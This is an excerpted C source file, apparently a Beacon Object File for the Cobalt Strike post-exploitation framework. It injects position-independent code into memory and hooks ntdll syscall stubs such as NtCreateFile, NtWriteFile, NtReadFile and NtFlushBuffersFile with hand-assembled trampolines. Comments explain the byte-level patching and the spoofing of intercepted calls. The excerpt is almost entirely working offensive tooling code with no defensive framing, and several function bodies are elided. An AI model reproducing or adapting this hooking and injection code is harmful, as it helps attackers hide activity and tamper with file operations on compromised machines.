...
void patchAddr(char** buffer, int buflen) {
    ...
    char placeholder[] = {0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
...
void inject(char* pic, int picLen, void*** pPICAddr) {
    ...
    LPVOID Addr =
        VirtualAlloc(NULL, picLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
...
LPVOID hookNtFunction(char* ntfunction, void** ntfunctionHookAddr,
                      LPVOID* trampoline, LPVOID* origbytes, BOOL write) {
    // Install hook
     ...
     * We have to read 32 and then determine which version we are working with
     ...
     * 00007ffd`d4c4db58 f604250803fe7f01 test    byte ptr [SharedUserData+0x308
     * (00000000`7ffe0308)],1 00007ffd`d4c4db60 7503            jne
     * ntdll!NtCreateFile+0x15 (00007ffd`d4c4db65) 00007ffd`d4c4db62 0f05
     * syscall 00007ffd`d4c4db64 c3              ret 00007ffd`d4c4db65 cd2e int
     * 2Eh 00007ffd`d4c4db67 c3              ret 00007ffd`d4c4db68
     * 0f1f840000000000 nop     dword ptr [rax+rax]
     */

    // Read entire NtFunction into buffer
    ReadProcessMemory(GetCurrentProcess(), ntfunctionAddr, ntreadbytes, 32,
                      &bytesRead);

    // Need to determine if we are dealing with old or new syscall format; look
    // for syscall location If syscall found at 9th and 10th bytes in Nt
    // function, on old version with 16 byte length
    BOOL bOldSyscallFormat = FALSE;
    if (ntreadbytes[8] == 0x0f && ntreadbytes[9] == 0x05)
        bOldSyscallFormat = TRUE;

    /*
     * We need to overwrite the first instructions with a jmp to our custom
     * function/code RAX ends up holding the syscall number (52h/55h above), so
     * we can use this register as long as is holds the syscall number before we
     * make the syscall Note that we must eventually perform every instruction
     * in the NtFunction; anything we overwrite with our hook will need to be
     * executed later
     */

    // Save off the original bytes of the NtFunction for restoration later
    // Note that in both old & new format we are only overwriting 16 bytes with
    // our hook
    *origbytes = calloc(17, sizeof(char));
    ...
    if (bOldSyscallFormat) {
        /*
         * We need to assemble our trampoline that is executed at the end of all
         * calls to our hooked NtFunctions that we do NOT want to alter/spoof We
         * need to copy the instructions that we overwrite with our original
         * hook into the trampoline as well as a jmp back to our NtFunction at
         * the proper address
         *
        ...
        // Now need a push RAX instruction in order to save the syscall number
        // on the stack so we can use RAX to jmp back to our NtFunction
        char pusheax[] = {0x50};
        memcpy(&nttrampoline[8], &pusheax[0], 1);

        // Now that we have set up our registers properly want to make the
        // syscall, but we want to do so from within NTDLL. Going to make a jump
        // back to the NtFunction at the pop RAX instruction we write there as
        // part of our hook
        ...
        /*
         * We need to assemble the bytes we will use to jmp back to our
         * NtFunction at the proper location mov RAX, < 8 byte address to jump
         * to > jmp RAX
         */
        char jumpbackbytes[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0};

        // Create jump by patching in address of syscall
        memcpy(&jumpbackbytes[2], &jumpbackaddr, 8);

        // Assemble final trampoline by patching in jumpbackbytes after original
        // NtFunction bytes
        ...
        *trampoline = VirtualAlloc(NULL, 21, MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(GetCurrentProcess(), (LPVOID)*trampoline,
                           &nttrampoline, 21, &bytesWritten);
         ...
         * Finished trampoline
         *
         * 000001E80D530000 | 4C:8BD1                      | MOV R10, RCX #
         * Original NtFunction instruction 000001E80D530003 | B8 0F000000 | MOV
         * EAX, F                              # Move syscall number into RAX
         * 000001E80D530008 | 50                           | PUSH RAX # Save
         * syscall number on stack 000001E80D530009 | 48:B8 5F3D3E9AFC7F0000 |
         * MOV RAX, ntdll.7FFC9A3E3D5F             # Move the address we want to
         * jmp to in NtFunction into RAX 000001E80D530013 | FFE0 | JMP RAX # Jmp
         * to NtFunction
         *
         * Assemble NtFunction hook
         * The patch that we write into the actual Nt function can use RAX to
         * jump to our hook function
         */

        char hookBytes[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0xFF, 0xE0, 0x58, 0x0f, 0x05, 0xc3};

        // Finalize patch by copying in the address of the proper ntfunctionHook
        // address
        ...
        WriteProcessMemory(GetCurrentProcess(), (LPVOID)ntfunctionAddr,
                           hookBytes, 16, &bytesWritten);

        /*
         * Final state of hooked NtFunction:
         *
         * ntdll!NtCreateFile:
         * 0000000077949DD0 | 48:B8 00001C0000000000       | MOV RAX,1C0000h
         * # Move address of our custom function into RAX 0000000077949DDA |
         * FFE0                         | JMP RAX # Jump to our custom function
         * 0000000077949DDC | 58                           | POP RAX # Restore
         * the syscall number to RAX from the stack 0000000077949DDD | 0F05 |
         * SYSCALL                                 # Issue syscall
         * 0000000077949DDF | C3                           | RET # Return to
         * caller of NtFunction
         */
    }
    ...
    // Otherwise we are on new version with 32 byte length
        ...
        // Now that we have set up our registers properly set up we want to make
        // the syscall, but we want to do so from within NTDLL. Going to make a
        // jump back to the NtFunction at the pop RAX instruction we wrote there
        // as part of our hook
        ...
        *trampoline = VirtualAlloc(NULL, 29, MEM_COMMIT, PAGE_READWRITE);
         ...
         * Original NtFunction instruction 000001E80D530003 | B8 0F000000 | MOV
         * EAX, F                              # Move syscall number into RAX
         * 000001E80D530008 | F60425 0803FE7F 01           | TEST BYTE PTR
         * DS:[7FFE0308], 1          # Test to see if we use syscall or int 2e
         * -> sets ZF flag 000001E80D530010 | 50                           |
         * PUSH RAX                                # Save syscall number on
         * stack 000001E80D530011 | 48:B8 5F3D3E9AFC7F0000       | MOV RAX,
         * ntdll.7FFC9A3E3D5F             # Move the address we want to jmp to
         * in NtFunction into RAX 000001E80D53001B | FFE0 | JMP RAX # Jmp to
         * NtFunction
         *
         * Assemble NtFunction hook
         * The patch that we write into the actual Nt function can use RAX to
         * jump to our hook function Note that doing so destroys the TEST
         * instruction, which will be placed in our trampoline
         */

        char hookBytes[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0xFF, 0xE0, 0x90, 0x90, 0x90, 0x58};
         ...
         *
         * ntdll!NtCreateFile:
         * 00007FFC9A3E3D50 | 48:B8 000003C8AA010000       | MOV RAX,
         * 1AAC8030000       				# Move address of our
         * custom function into RAX 00007FFC9A3E3D5A | FFE0 | JMP RAX # Jump to
         * our custom function 00007FFC9A3E3D5C | 90                           |
         * NOP 00007FFC9A3E3D5D | 90                           | NOP
         * 00007FFC9A3E3D5E | 90                           | NOP
         * 00007FFC9A3E3D5F | 58                           | POP RAX # Restore
         * the syscall number to RAX from the stack 00007FFC9A3E3D60 | 75 03 |
         * JNE ntdll.7FFC9A3E3D65                  # If test instruction in
         * trampoline resulted in ZF = 1, jmp to int 2e instruction
         * 00007FFC9A3E3D62 | 0F05                         | SYSCALL # Issue
         * syscall 00007FFC9A3E3D64 | C3                           | RET #
         * Return to caller of NtFunction 00007FFC9A3E3D65 | CD 2E | INT 2E #
         * Alternate syscall instruction 00007FFC9A3E3D67 | C3 | RET # Return to
         * caller of NtFunction 00007FFC9A3E3D68 | 0F1F8400 00000000 | NOP DWORD
         * PTR DS:[RAX + RAX], EAX       # ???
         */
    }
...
LPVOID hookNtFunction2(char* ntfunction, void** ntfunctionHookAddr,
                       LPVOID* trampoline, LPVOID* origbytes, BOOL write) {
    /* Install Hook */
...
void go(char* args, int argc) {
    ...
    char* ntflushbuffersfilebytes =
        BeaconDataExtract(&parser, &pFileInfo->PICNtFlushBuffersFileLen);
    ...
    inject(ntflushbuffersfilebytes, pFileInfo->PICNtFlushBuffersFileLen,
           &pFileInfo->PICNtFlushBuffersFile);
    ...
    internal_printf("\t\\_ NtWriteFile: %p [%d] \n", *pFileInfo->PICNtWriteFile,
                    pFileInfo->PICNtWriteFileLen);
    internal_printf("\t\\_ NtClose: %p [%d] \n", *pFileInfo->PICNtClose,
                    pFileInfo->PICNtCloseLen);
    ...
    internal_printf("\t\\_ NtReadFile: %p [%d] \n", *pFileInfo->PICNtReadFile,
                    pFileInfo->PICNtReadFileLen);
    internal_printf("\t\\_ NtOpenFile: %p [%d] \n", *pFileInfo->PICNtOpenFile,
                    pFileInfo->PICNtOpenFileLen);
    ...
    hookNtFunction("NtFlushBuffersFile", pFileInfo->PICNtFlushBuffersFile,
                   &pFileInfo->NtFlushBuffersFiletrampoline,
                   &pFileInfo->NtFlushBuffersFileorigbytes, TRUE);
